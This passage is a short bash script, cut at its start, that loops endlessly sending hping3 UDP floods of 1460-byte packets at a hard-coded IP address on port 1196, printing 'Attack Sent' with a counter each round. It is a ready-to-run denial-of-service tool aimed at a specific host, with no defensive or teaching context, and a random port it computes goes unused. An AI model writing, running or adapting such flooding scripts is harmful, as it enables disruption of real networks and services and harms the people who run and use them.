pport=0
while :; do
   request=$((request+1))
   dstprt=$(shuf -i 1-65535 -n 1)
   timeout 0.5 hping3 -d 1460 --udp --flood -V -p 1196 66.70.132.200 > /dev/null 2>&1
   clear
   echo "Attack Sent -> request sent: $request"
   sleep 1
done